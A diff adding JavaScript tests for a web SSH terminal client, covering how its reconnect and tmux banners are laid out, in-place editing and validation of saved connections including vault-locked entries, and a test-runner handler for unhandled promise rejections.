+  const env = await mkEnv(FB_PLAN([], '/home/alice')); const win = env.win;
+  const p = await _onePane(win);
+  const stack = p.el.querySelector('.pane-overlays');
+  ok(stack && stack.parentElement.classList.contains('pane-term'),
+     'the stack is anchored to the terminal area, not the pane column');
+  const code = html.replace(/\/\*[\s\S]*?\*\//g, '');
+  ok(/\.pane-overlays\{position:absolute/.test(code), 'stack is out of flow');
+  ok(/\.pane-overlays\{[^}]*pointer-events:none/.test(code) &&
+     /\.pane-overlays>\*\{pointer-events:auto\}/.test(code),
+     'clicks pass through the stack, but not through the bars themselves');
+  ok(!/\.reconnect-bar\{[^}]*flex-shrink/.test(code) || !/\.pane>\s*\.reconnect-bar/.test(code),
+     'reconnect bar no longer participates in the pane column');
+  // All three bars end up in the stack, in DOM order, none in the column.
+  win.showReconnectBar(p);
+  win.showTmuxBar(p, 'tmux missing');
+  p.firstFailureAt = Date.now();
+  win.setReconnecting(p, true);
+  const inStack = ['[data-reconnect]', '[data-tmux-bar]', '.pane-reconnect']
+    .map(sel => { const el = p.el.querySelector(sel); return !!el && el.parentElement === stack; });
+  ok(inStack.every(Boolean), 'reconnect, tmux and retry banners all live in the stack; got ' + JSON.stringify(inStack));
+  ok(p.el.querySelector('.pane-bar').nextElementSibling.classList.contains('pane-term'),
+     'nothing sits between the pane bar and the terminal');
+  win.setReconnecting(p, false);
+  cleanup(env);
+});
+
+test('saved connections can be edited in place', async () => {
+  // Before this, a typo in a name, user or port meant Delete + create
+  // again - and for a vault-backed entry, re-entering the password.
+  const plan = [{action: 'config', response: {restrict_hosts: false, connections: [], vault_enabled: true}}];
+  const env = await mkEnv(plan); const win = env.win;
+  win.localStorage.setItem('websh_connections', JSON.stringify([
+    {name: 'typo prod', host: 'prod.example', user: 'alcie', port: 22},
+    {name: 'vault one', host: 'db.example', user: 'root', port: 2222, conn_id: 'C'.repeat(26)},
+  ]));
+  win._idbHasKeyCache = true;
+  win.renderSaved();
+  const card = i => $(win, 'savedList').querySelector(`.sv[data-idx="${i}"]`);
+  ok(card(0).querySelector('[data-edit]'), 'each card has an edit button');
+  // Local entry: everything is editable and validated.
+  card(0).querySelector('[data-edit]').click();
+  let row = card(0);
+  ok(row.classList.contains('editing'), 'editor opened in place');
+  row.querySelector('.e-user').value = 'alice with space';
+  row.querySelector('.sv-save').click();
+  ok(/User:/.test(row.querySelector('.sv-edit-note').textContent), 'invalid user refused; got ' +
+     row.querySelector('.sv-edit-note').textContent);
+  row.querySelector('.e-user').value = 'alice';
+  row.querySelector('.e-port').value = '70000';
+  row.querySelector('.sv-save').click();
+  ok(/Port/.test(row.querySelector('.sv-edit-note').textContent), 'invalid port refused');
+  row.querySelector('.e-port').value = '2200';
+  row.querySelector('.e-name').value = 'prod web';
+  row.querySelector('.sv-save').click();
+  let saved = JSON.parse(win.localStorage.getItem('websh_connections'));
+  ok(saved[0].name === 'prod web' && saved[0].user === 'alice' && saved[0].port === 2200,
+     'edits persisted; got ' + JSON.stringify(saved[0]));
+  ok(!card(0).classList.contains('editing'), 'editor closed after saving');
+  ok(/prod web/.test(card(0).textContent) && /alice@prod.example:2200/.test(card(0).textContent),
+     'card re-rendered; got ' + card(0).textContent);
+  // Vault entry: the destination is inside the encrypted blob, so only
+  // the name can change - and the UI says why.
+  card(1).querySelector('[data-edit]').click();
+  row = card(1);
+  ok(row.querySelector('.e-host').disabled && row.querySelector('.e-user').disabled &&
+     row.querySelector('.e-port').disabled, 'destination locked for a vault entry');
+  ok(/re-save the credentials/i.test(row.querySelector('.sv-edit-note').textContent), 'and it explains why');
+  row.querySelector('.e-name').value = 'db primary';
+  row.querySelector('.sv-save').click();
+  saved = JSON.parse(win.localStorage.getItem('websh_connections'));
+  ok(saved[1].name === 'db primary' && saved[1].host === 'db.example' && saved[1].conn_id,
+     'only the name changed, conn_id kept; got ' + JSON.stringify(saved[1]));
+  // Cancel leaves everything alone, and clicking inside the editor
+  // must not start a connection.
+  const before = win.localStorage.getItem('websh_connections');
+  card(0).querySelector('[data-edit]').click();
+  card(0).querySelector('.e-name').value = 'discarded';
+  card(0).querySelector('.sv-cancel').click();
+  ok(win.localStorage.getItem('websh_connections') === before, 'cancel discards');
+  ok(env.log.filter(e => e.action === 'connect').length === 0, 'editing never connects');
+  cleanup(env);
+});
+
 // =====================================================================
+// A stray rejection used to take node down mid-run with no summary, so
+// a crash looked like "no result" rather than a failure. Count it as a
+// failure against the scenario that was running and keep going.
+let current = '(between scenarios)';
+process.on('unhandledRejection', e => {
+  failed++;
+  failures.push(current + ': unhandled rejection: ' + (e && e.message || e));
+  console.log('  UNHANDLED REJECTION: ' + (e && e.stack || e));
+});
 (async () => {
   for (const s of scenarios) {
+    current = s.name;
     console.log('\n=== ' + s.name + ' ===');
     try { await s.fn(); } catch (e) {
       failed++;
